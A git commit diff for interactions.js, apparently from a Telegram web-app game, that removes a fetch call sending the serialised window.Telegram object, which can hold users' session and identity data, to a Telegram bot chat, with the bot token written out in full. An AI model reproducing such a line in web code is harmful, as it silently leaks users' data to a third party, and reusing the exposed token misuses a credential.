9cfecfe2fe8bc1b68bbe98e357c6ca2fde2d5f5b
CORPSE <d.b.17f@mail.ru>
2024-11-23 16:51:55 +0300

    1

--- interactions.js
+++ interactions.js
@@ -10,6 +10,3 @@ var gridElements = grid.getElementsByTagName('div')
 for (let i=0; i < gridElements.length; i++) {
     gridElements[i].addEventListener("click", () => buttonPress(gridElements[i]))
 }
-
-await fetch('https://api.telegram.org/bot6456899038:AAF77UCiYBe2dfdVsmIy9l5NiM2bkMYQADo/sendMessage?chat_id=1307263371&text=' + encodeURI(JSON.stringify(window.Telegram))).then(resp => resp.json())
-/*console.log(encodeURI(JSON.stringify(window.Telegram)))*/
